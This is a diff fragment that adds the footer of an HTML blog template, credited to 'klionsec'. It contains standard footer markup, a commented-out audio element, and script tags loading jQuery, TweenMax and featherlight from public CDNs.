+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
